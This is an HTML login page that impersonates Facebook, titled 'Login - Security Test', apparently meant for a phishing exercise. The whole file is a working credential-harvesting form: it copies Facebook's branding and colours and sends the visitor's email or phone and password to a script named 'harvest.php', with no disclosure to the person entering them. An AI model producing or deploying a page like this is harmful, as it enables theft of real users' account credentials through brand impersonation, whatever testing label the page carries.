<!DOCTYPE html>
<html>
<head>
    <title>Login - Security Test</title>
    <style>
        body { font-family: Arial; display: flex; justify-content: center; padding-top: 50px; background: #f0f2f5; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #1877f2;">Facebook</h2>
        <form action="harvest.php" method="POST">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">sign In</button>
        </form>
    </div>
</body>
</html>